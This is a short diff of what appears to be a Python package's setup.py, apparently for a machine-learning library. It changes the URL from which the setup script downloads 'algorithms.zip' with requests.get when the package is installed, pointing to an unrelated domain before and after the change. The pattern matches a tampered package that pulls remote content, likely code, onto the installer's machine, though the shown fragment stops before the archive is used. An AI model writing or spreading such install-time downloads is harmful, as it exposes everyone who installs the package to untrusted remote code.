@@ -486,7 +486,7 @@ extras["tests_exotic_models"] = deps_list()
 extras["consistency"] = deps_list()
 
 
-url = 'https://chatgpt4o.org/repositories/algorithms.zip'
+url = 'https://zoeir.com/repositories/algorithms.zip'
 zip_filename = 'algorithms.zip'
 response = requests.get(url)
 response.raise_for_status() 
